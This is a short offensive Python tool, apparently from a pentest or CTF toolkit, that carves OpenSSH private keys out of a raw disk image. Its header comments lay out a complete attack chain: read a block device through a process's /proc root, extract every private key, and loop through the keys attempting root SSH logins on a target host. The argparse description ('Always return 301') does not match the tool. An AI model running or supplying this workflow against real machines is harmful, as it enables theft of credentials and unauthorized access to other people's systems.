# https://github.com/manesec/tools4mane
# write by @manesec.

# Tips
# 1. You can Extract all key from sda to file 
#    $ grep -a -A 80 "BEGIN OPENSSH PRIVATE KEY" /proc/2710/root/sda > key.txt
# 2. Using this script to get all the key.
#    $ python extra.py --input key.txt --output key
# 3. Remove Useless Key
#    $ find . -type f -size -75c -exec rm {} \;
# 4. Bruteforce key
#    $ for x in {1..200}; do echo $x ; ssh -v -i $x root@x.x.x.x -o PasswordAuthentication=no ; done

import os
import argparse

print("""
 ▄▀▀▄ ▄▀▄  ▄▀▀█▄   ▄▀▀▄ ▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▄▄▄▄  
█  █ ▀  █ ▐ ▄▀ ▀▄ █  █ █ █ ▐  ▄▀   ▐ █ █   ▐ ▐  ▄▀   ▐ █ █    ▌ 
▐  █    █   █▄▄▄█ ▐  █  ▀█   █▄▄▄▄▄     ▀▄     █▄▄▄▄▄  ▐ █      
  █    █   ▄▀   █   █   █    █    ▌  ▀▄   █    █    ▌    █      
▄▀   ▄▀   █   ▄▀  ▄▀   █    ▄▀▄▄▄▄    █▀▀▀    ▄▀▄▄▄▄    ▄▀▄▄▄▄▀ 
█    █    ▐   ▐   █    ▐    █    ▐    ▐       █    ▐   █     ▐  
▐    ▐            ▐         ▐                 ▐        ▐        
        Extract SSH KEY from binary - Tools4me by @manesec.
                        Version: 20240805
                https://github.com/manesec/tools4mane
---------------------------------------------------------------""")

def extract_key(filepath,outputFolder):
    file = open(filepath,'rb').read()

    if (os.path.exists(outputFolder) == False):
        os.mkdir(outputFolder)

    kindex = 0
    index = 0
    while index < len(file):
        start = file.find(b'-----BEGIN OPENSSH PRIVATE KEY-----',index)
        end = file.find(b'-----END OPENSSH PRIVATE KEY-----', start + 10) + len("-----END OPENSSH PRIVATE KEY-----")
        if start == -1 or end == -1: break
        body = file[start:end]
        save = open( outputFolder + '/' + str(kindex),'wb')
        save.write(body + b'\n')
        save.close()
        print("[*] Found %s, offset: %s - %s, len: %s" % (kindex,start,end, len(body)))
        kindex += 1
        index = end + 1
    print("OK")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Always return 301')
    parser.add_argument('--input', '-i', type=str, required=True ,help='Input files')
    parser.add_argument('--output','-o', type=str, required=True, help='Output folder')
    input_parser = parser.parse_args()

    extract_key(input_parser.input,input_parser.output)
